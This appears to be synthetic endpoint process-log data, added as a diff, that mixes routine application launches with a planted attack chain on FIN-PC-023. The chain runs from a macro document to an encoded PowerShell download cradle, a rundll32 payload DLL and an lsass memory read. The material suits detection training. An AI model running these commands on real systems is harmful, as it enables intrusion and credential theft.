+2026-07-30 14:40:00,IT-PC-004,sarah.williams,explorer.exe,explorer.exe,explorer.exe,3240d7a1,Adobe Inc.
+2026-07-30 14:42:00,IT-PC-004,michael.brown,explorer.exe,explorer.exe,explorer.exe,9d4b2bf9,Adobe Inc.
+2026-07-30 14:44:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,9780c215,Adobe Inc.
+2026-07-30 14:46:00,DC-SERVER-01,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,b87b6384,Adobe Inc.
+2026-07-30 14:48:00,ENG-PC-019,ava.jackson,explorer.exe,chrome.exe,chrome.exe,d342af08,Microsoft
+2026-07-30 14:50:00,HR-PC-008,john.smith,explorer.exe,acrobat.exe,acrobat.exe,43c07d43,Google LLC
+2026-07-30 14:52:00,FILE-SERVER-02,james.taylor,explorer.exe,acrobat.exe,acrobat.exe,a394ed54,Microsoft
+2026-07-30 14:54:00,SALES-PC-002,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,a4540937,Zoom Video Communications
+2026-07-30 14:56:00,SALES-PC-002,emily.davis,explorer.exe,slack.exe,slack.exe,4c24a053,Slack Technologies
+2026-07-30 14:58:00,HR-PC-008,john.smith,explorer.exe,teams.exe,teams.exe,7089fc6d,Slack Technologies
+2026-07-30 15:00:00,SALES-PC-002,sophia.anderson,explorer.exe,excel.exe,excel.exe,5716dc2e,Adobe Inc.
+2026-07-30 15:02:00,DC-SERVER-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,bbf483ce,Zoom Video Communications
+2026-07-30 15:04:00,VPN-GW-01,michael.brown,explorer.exe,onedrive.exe,onedrive.exe,83d5bceb,Adobe Inc.
+2026-07-30 15:06:00,HR-PC-008,olivia.moore,explorer.exe,excel.exe,excel.exe,776abf09,Microsoft
+2026-07-30 15:08:00,IT-PC-004,sophia.anderson,explorer.exe,excel.exe,excel.exe,24108e9a,Microsoft
+2026-07-30 15:10:00,FIN-PC-023,david.wilson,explorer.exe,slack.exe,slack.exe,dd39d793,Adobe Inc.
+2026-07-30 15:12:00,VPN-GW-01,emily.davis,explorer.exe,teams.exe,teams.exe,d0401587,Zoom Video Communications
+2026-07-30 15:14:00,FILE-SERVER-02,olivia.moore,explorer.exe,excel.exe,excel.exe,c35bec2c,Google LLC
+2026-07-30 15:16:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,7faeb748,Zoom Video Communications
+2026-07-30 15:18:00,SALES-PC-002,john.smith,explorer.exe,outlook.exe,outlook.exe,f1fac6e7,Slack Technologies
+2026-07-30 15:20:00,LEGAL-PC-006,sophia.anderson,explorer.exe,excel.exe,excel.exe,3713b466,Adobe Inc.
+2026-07-30 15:22:00,ENG-PC-019,john.smith,explorer.exe,chrome.exe,chrome.exe,4806f804,Slack Technologies
+2026-07-30 15:24:00,FILE-SERVER-02,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,896490ab,Microsoft
+2026-07-30 15:26:00,HR-PC-008,james.taylor,explorer.exe,teams.exe,teams.exe,e1e89e7e,Zoom Video Communications
+2026-07-30 15:28:00,ENG-PC-019,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,0b95017c,Slack Technologies
+2026-07-30 15:30:00,FIN-PC-023,ava.jackson,explorer.exe,notepad.exe,notepad.exe,31d4ee09,Zoom Video Communications
+2026-07-30 15:32:00,LEGAL-PC-006,david.wilson,explorer.exe,outlook.exe,outlook.exe,62e7c1a6,Adobe Inc.
+2026-07-30 15:34:00,SALES-PC-002,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,d3479a3b,Adobe Inc.
+2026-07-30 15:36:00,FILE-SERVER-02,sarah.williams,explorer.exe,teams.exe,teams.exe,f99f0704,Microsoft
+2026-07-30 15:38:00,VPN-GW-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,8ece1128,Zoom Video Communications
+2026-07-30 15:40:00,DC-SERVER-01,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,8255da61,Slack Technologies
+2026-07-30 15:42:00,LEGAL-PC-006,john.smith,explorer.exe,chrome.exe,chrome.exe,09f64405,Google LLC
+2026-07-30 15:44:00,ENG-PC-019,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,74fd33d1,Google LLC
+2026-07-30 15:46:00,FILE-SERVER-02,daniel.thomas,explorer.exe,teams.exe,teams.exe,53f591dc,Adobe Inc.
+2026-07-30 15:48:00,ENG-PC-019,michael.brown,explorer.exe,slack.exe,slack.exe,fd98fe33,Adobe Inc.
+2026-07-30 15:50:00,IT-PC-004,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,81df6517,Adobe Inc.
+2026-07-30 15:52:00,LEGAL-PC-006,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,4cbf131d,Slack Technologies
+2026-07-30 15:54:00,FIN-PC-023,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,ac7e937c,Microsoft
+2026-07-30 15:56:00,VPN-GW-01,ava.jackson,explorer.exe,explorer.exe,explorer.exe,cbf81f86,Microsoft
+2026-07-30 15:58:00,FILE-SERVER-02,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,f791f1e5,Adobe Inc.
+2026-07-30 16:00:00,FILE-SERVER-02,emily.davis,explorer.exe,chrome.exe,chrome.exe,9561c813,Slack Technologies
+2026-07-30 16:02:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,c64c9647,Slack Technologies
+2026-07-30 16:04:00,DC-SERVER-01,emily.davis,explorer.exe,chrome.exe,chrome.exe,9293f705,Microsoft
+2026-07-30 16:06:00,FIN-PC-011,john.smith,explorer.exe,code.exe,code.exe,504e2687,Slack Technologies
+2026-07-30 16:08:00,DC-SERVER-01,james.taylor,explorer.exe,excel.exe,excel.exe,690e7e62,Adobe Inc.
+2026-07-30 16:10:00,FILE-SERVER-02,sophia.anderson,explorer.exe,chrome.exe,chrome.exe,b4adaf89,Google LLC
+2026-07-30 16:12:00,LEGAL-PC-006,emily.davis,explorer.exe,notepad.exe,notepad.exe,5336723b,Slack Technologies
+2026-07-30 16:14:00,LEGAL-PC-006,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,f4e95734,Google LLC
+2026-07-30 16:16:00,SALES-PC-002,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,8bd88fcd,Zoom Video Communications
+2026-07-30 16:18:00,IT-PC-004,ava.jackson,explorer.exe,code.exe,code.exe,31383975,Google LLC
+2026-07-30 16:20:00,IT-PC-004,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,3990e2c9,Zoom Video Communications
+2026-07-30 16:22:00,IT-PC-004,emily.davis,explorer.exe,code.exe,code.exe,5129950d,Slack Technologies
+2026-07-30 16:24:00,ENG-PC-019,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,49ac9087,Microsoft
+2026-07-30 16:26:00,FILE-SERVER-02,daniel.thomas,explorer.exe,slack.exe,slack.exe,e5508ea2,Slack Technologies
+2026-07-30 16:28:00,ENG-PC-019,michael.brown,explorer.exe,explorer.exe,explorer.exe,0ac4de85,Zoom Video Communications
+2026-07-30 16:30:00,HR-PC-008,olivia.moore,explorer.exe,code.exe,code.exe,a7edc8d8,Zoom Video Communications
+2026-07-30 16:32:00,SALES-PC-002,emily.davis,explorer.exe,excel.exe,excel.exe,d3f4a49b,Adobe Inc.
+2026-07-30 16:34:00,IT-PC-004,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,23245211,Microsoft
+2026-07-30 16:36:00,FILE-SERVER-02,ava.jackson,explorer.exe,excel.exe,excel.exe,3e11bafe,Microsoft
+2026-07-30 16:38:00,LEGAL-PC-006,emily.davis,explorer.exe,excel.exe,excel.exe,0d700ea4,Microsoft
+2026-07-30 16:40:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,19bd4f93,Google LLC
+2026-07-30 16:42:00,FIN-PC-023,daniel.thomas,explorer.exe,teams.exe,teams.exe,682b163a,Slack Technologies
+2026-07-30 16:44:00,SALES-PC-002,emily.davis,explorer.exe,explorer.exe,explorer.exe,52380bf2,Zoom Video Communications
+2026-07-30 16:46:00,FIN-PC-023,sarah.williams,explorer.exe,acrobat.exe,acrobat.exe,3b72c86d,Adobe Inc.
+2026-07-30 16:48:00,FIN-PC-023,michael.brown,explorer.exe,slack.exe,slack.exe,e1dace6a,Google LLC
+2026-07-30 16:50:00,FIN-PC-023,james.taylor,explorer.exe,code.exe,code.exe,2fb21e66,Zoom Video Communications
+2026-07-30 16:52:00,FIN-PC-023,john.smith,explorer.exe,explorer.exe,explorer.exe,9165f2ed,Adobe Inc.
+2026-07-30 16:54:00,HR-PC-008,olivia.moore,explorer.exe,explorer.exe,explorer.exe,74503887,Adobe Inc.
+2026-07-30 16:56:00,LEGAL-PC-006,sophia.anderson,explorer.exe,teams.exe,teams.exe,d9df0d0e,Adobe Inc.
+2026-07-30 16:58:00,SALES-PC-002,david.wilson,explorer.exe,excel.exe,excel.exe,cf0e6d2b,Microsoft
+2026-07-30 10:00:00,FIN-PC-023,john.smith,outlook.exe,winword.exe,"winword.exe /n ""C:\Users\john.smith\Downloads\invoice_update.docm""",a1b2c3d4e5f6,Microsoft
+2026-07-30 10:05:00,FIN-PC-023,john.smith,winword.exe,powershell.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA,7ab92ff03ac91b7de4f812309abcc88e,Unknown
+2026-07-30 10:08:00,FIN-PC-023,john.smith,powershell.exe,payload.dll (rundll32.exe),"rundll32.exe C:\Temp\payload.dll,DllMain",9af72bc1e4a83d9f6b21c7ea45d21f00,Unknown
+2026-07-30 10:15:00,FIN-PC-023,SYSTEM,payload.dll,lsass_access.exe,internal memory read of lsass.exe (PID 712),9af72bc1e4a83d9f6b21c7ea45d21f00,Unknown
